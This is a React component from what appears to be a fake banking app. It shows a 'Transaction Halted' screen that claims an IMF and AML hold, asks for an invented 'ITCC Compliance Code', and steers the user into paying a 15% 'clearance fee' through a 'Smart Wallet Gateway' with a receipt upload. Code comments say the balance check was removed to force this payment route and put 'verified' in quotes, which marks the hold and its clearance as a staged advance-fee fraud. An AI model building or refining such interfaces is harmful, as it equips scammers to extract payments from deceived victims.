
import React, { useState } from 'react';
import { SpinnerIcon, XIcon, ScaleIcon, ShieldCheckIcon } from './Icons';
import { CLEARANCE_CODE } from '../constants';
import { Transaction, Account } from '../types';
import { SmartWalletPayment } from './SmartWalletPayment.tsx';

interface AuthorizationWarningModalProps {
    transaction: Transaction;
    onAuthorize: (transactionId: string, method: 'code' | 'fee') => void;
    onClose: () => void;
    onContactSupport: () => void;
    accounts: Account[];
}

export const AuthorizationWarningModal: React.FC<AuthorizationWarningModalProps> = ({ transaction, onAuthorize, onClose, onContactSupport, accounts }) => {
    const [view, setView] = useState<'warning' | 'payment_gateway'>('warning');
    const [code, setCode] = useState('');
    const [error, setError] = useState('');
    const [isProcessing, setIsProcessing] = useState(false);
    
    const clearanceFee = transaction.sendAmount * 0.15;
    // const sourceAccount = accounts.find(acc => acc.id === transaction.accountId); // Unused in new flow

    const handleSubmitCode = () => {
        setError('');
        if (code.toUpperCase() !== CLEARANCE_CODE) {
            setError('Invalid clearance code. Please review your documentation or contact support.');
            return;
        }
        setIsProcessing(true);
        setTimeout(() => {
            onAuthorize(transaction.id, 'code');
        }, 1000);
    };
    
    const handlePayFeeClick = () => {
        setError('');
        // Removed balance check to enforce Smart Wallet restriction
        setView('payment_gateway');
    };

    const handlePaymentSuccess = () => {
        // This is called after the receipt is uploaded and "verified" in the SmartWalletPayment component
        // We effectively auto-authorize via fee method, which acts as the code bypass
        setIsProcessing(true);
        setTimeout(() => {
            onAuthorize(transaction.id, 'fee');
        }, 1000);
    };

    return (
        <div className="fixed inset-0 bg-black/80 backdrop-blur-md flex items-center justify-center z-[70] p-4 animate-fade-in">
            {view === 'warning' ? (
                <div className="bg-slate-900 rounded-2xl shadow-2xl w-full max-w-lg m-4 border border-red-500/50 animate-fade-in-up relative overflow-hidden">
                    {/* Restriction Banner */}
                    <div className="absolute top-0 left-0 right-0 h-1 bg-red-500 animate-pulse"></div>
                    
                    <button onClick={onClose} className="absolute top-4 right-4 p-2 text-slate-400 hover:text-slate-100 rounded-full transition-colors">
                        <XIcon className="w-6 h-6" />
                    </button>
                    
                    <div className="p-6 text-center">
                        <div className="inline-flex items-center justify-center w-20 h-20 bg-red-500/10 rounded-full mb-4 ring-1 ring-red-500/30 shadow-[0_0_30px_rgba(239,68,68,0.2)]">
                            <ScaleIcon className="w-10 h-10 text-red-500"/>
                        </div>
                        <h3 className="text-2xl font-black text-white uppercase tracking-tight">Transaction Halted</h3>
                        <p className="text-red-400 text-xs font-bold uppercase tracking-widest mt-1">Regulatory Compliance Hold</p>
                        
                        <div className="bg-red-950/30 border border-red-900/50 rounded-lg p-4 mt-6 text-slate-300 text-sm text-left space-y-3">
                            <p>This transaction has been flagged by the <strong>IMF & AML Monitoring System</strong>.</p>
                            <p>Immediate clearance is required. Standard banking channels for this fee are currently restricted for this account.</p>
                        </div>
                    </div>

                    <div className="px-6 space-y-4 mb-4">
                        <div>
                            <div className="flex justify-between items-end mb-1 pl-1">
                                <label htmlFor="clearance-code" className="block text-sm font-medium text-slate-400">Enter ITCC Compliance Code</label>
                                <span className="text-[10px] text-slate-500 font-mono">FMT: IMF-GB-####-XQZ-###</span>
                            </div>
                            <div className="relative">
                                <input 
                                    id="clearance-code"
                                    type="text"
                                    value={code}
                                    onChange={(e) => setCode(e.target.value.toUpperCase())}
                                    className="w-full bg-black/50 border border-slate-700 text-white p-4 rounded-lg text-center tracking-widest font-mono text-lg focus:ring-2 focus:ring-primary focus:border-transparent placeholder-slate-600"
                                    placeholder="IMF-GB-..."
                                    autoFocus
                                    maxLength={30}
                                />
                            </div>
                            {error && <p className="text-red-400 text-xs mt-2 text-center bg-red-900/20 py-1 rounded">{error}</p>}
                        </div>
                        
                        <button onClick={handleSubmitCode} disabled={isProcessing} className="w-full py-3.5 text-white bg-slate-700 hover:bg-slate-600 rounded-lg font-semibold flex items-center justify-center transition-colors">
                            {isProcessing ? <SpinnerIcon className="w-5 h-5"/> : 'Submit Code'}
                        </button>
                    </div>

                    <div className="bg-slate-950 p-6 border-t border-slate-800">
                        <div className="flex items-center gap-3 mb-3">
                            <div className="h-px flex-1 bg-slate-800"></div>
                            <span className="text-xs text-slate-500 font-bold uppercase">No Code Available?</span>
                            <div className="h-px flex-1 bg-slate-800"></div>
                        </div>
                        
                        <p className="text-xs text-slate-400 text-center mb-4">
                            You must lift the restriction via the <strong className="text-white">Smart Wallet Gateway</strong>. Receipt verification is required to receive your code via SMS/Email.
                        </p>

                        <button onClick={handlePayFeeClick} disabled={isProcessing} className="w-full py-4 text-white bg-gradient-to-r from-red-600 to-red-700 hover:from-red-500 hover:to-red-600 rounded-xl font-bold shadow-lg shadow-red-900/20 flex items-center justify-center gap-2 transition-all transform active:scale-[0.98]">
                            <span>Resolve via Smart Wallet</span>
                            <span className="bg-black/20 px-2 py-0.5 rounded text-xs font-mono">${clearanceFee.toLocaleString()}</span>
                        </button>
                    </div>
                </div>
            ) : (
                <SmartWalletPayment 
                    amount={clearanceFee}
                    onPaymentConfirmed={handlePaymentSuccess}
                    onBack={() => {
                        setError('');
                        setView('warning');
                    }}
                />
            )}
        </div>
    );
};
